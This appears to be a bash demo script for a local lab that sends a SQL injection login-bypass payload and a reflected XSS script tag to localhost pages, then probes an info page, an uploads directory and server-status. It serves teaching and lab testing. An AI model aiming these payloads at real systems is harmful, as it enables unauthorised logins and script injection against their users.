#!/bin/bash
# Vulnerability Demo Script
# Automated demonstration of security vulnerabilities

echo "=== SECURITY VULNERABILITY DEMONSTRATION ==="
echo "Environment: Lab Testing System"
echo "Date: $(date)"
echo ""

echo "1. Testing SQL Injection vulnerability..."
curl -s -X POST -d "username=admin' OR '1'='1&password=anything" \
     http://localhost/sql_injection.php | grep -o "Login successful" || echo "Demo endpoint not ready"

echo ""
echo "2. Testing XSS vulnerability..."  
curl -s "http://localhost/xss_test.php?name=<script>alert('XSS')</script>" \
     | grep -o "<script>" || echo "Demo endpoint not ready"

echo ""
echo "3. Testing information disclosure..."
curl -s http://localhost/info.php | head -5 || echo "Demo endpoint not ready"

echo ""
echo "4. Checking uploaded files directory..."
ls -la /var/www/html/uploads/ 2>/dev/null || echo "Upload directory not ready"

echo ""
echo "5. System information leak..."
echo "Server details exposed at: http://localhost/server-status"

echo ""
echo "=== DEMO COMPLETE ==="
echo "All vulnerabilities demonstrated"
echo "Remember: This is for education only!"